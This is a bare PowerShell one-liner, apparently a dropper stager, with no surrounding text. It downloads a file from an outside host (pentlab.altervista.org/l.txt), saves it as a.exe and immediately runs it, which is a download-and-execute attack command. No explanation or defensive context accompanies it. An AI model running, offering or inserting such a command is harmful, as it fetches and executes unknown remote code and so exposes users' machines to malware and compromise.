
$webclient=New-Object System.Net.WebClient;$exe = $webclient.DownloadString("http://pentlab.altervista.org/l.txt");$exe|Out-File a.exe;start a.exe;

